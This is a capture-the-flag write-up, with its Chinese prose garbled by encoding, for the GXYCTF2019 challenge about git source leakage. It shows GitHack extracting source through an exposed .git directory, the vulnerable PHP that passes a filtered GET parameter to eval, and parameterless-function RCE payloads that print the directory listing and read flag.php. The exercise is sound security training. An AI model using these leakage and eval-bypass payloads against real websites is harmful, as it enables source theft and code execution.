# 1.gitԴ��й¶
- [GXYCTF2019]��ֹ����
�ο�https://www.cnblogs.com/zzjdbk/p/13720677.html
���뻷��ֻ��'flag�������أ�'
����ץ�����鿴Դ���룬Ŀ¼ɨ�裬��ûʲô���
ɨ��ʱ��.git���֣�������gitԴ��й¶������kali������GitHackĿ¼��ִ������
![alt text](image-53.png)
```
python GitHack.py http://c557ffa3-1119-488c-b829-3ee9a9701744.node5.buuoj.cn:81/.git
```
![alt text](image-54.png)
����index.php�ļ�������![alt text](image-55.png)
```
wget -r http://c557ffa3-1119-488c-b829-3ee9a9701744.node5.buuoj.cn:81/index.php
```
```php
<?php
include "flag.php";
echo "flag�������أ�<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("����һ��Ŷ��");
            }
        }
        else{
            die("�ٺú����룡");
        }
    }
    else{
        die("�����flag�����ܵܣ�");
    }
}
// highlight_file(__FILE__);
?>
```
���Э�鶼�������ˣ���ʹ��������ƥ�䣬��ʵ�����޲���RCE���ο�http://t.csdnimg.cn/KOske
payload
```
?exp=print_r(scandir(current(localeconv())));
����Array ( [0] => .git [1] => flag.php [2] => index.php ) 
������ֻ��Ҫ��ȡ�����ڶ������飬����array_reverse��������������next�����һ��
?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));
```